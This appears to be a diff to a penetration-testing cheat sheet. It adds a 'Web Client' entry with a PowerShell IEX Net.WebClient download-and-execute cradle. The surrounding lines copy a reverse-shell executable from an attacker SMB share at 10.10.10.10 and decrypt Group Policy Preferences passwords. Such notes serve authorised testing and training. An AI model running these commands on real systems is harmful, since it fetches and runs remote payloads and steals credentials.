@@ -133,3 +133,9 @@ copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe #Windows
 ```python
 gpp-decrypt "<hash>"
 ```
+
+### Web Client
+
+```python
+IEX(New-Object Net.WebClient).downloadstring
+```
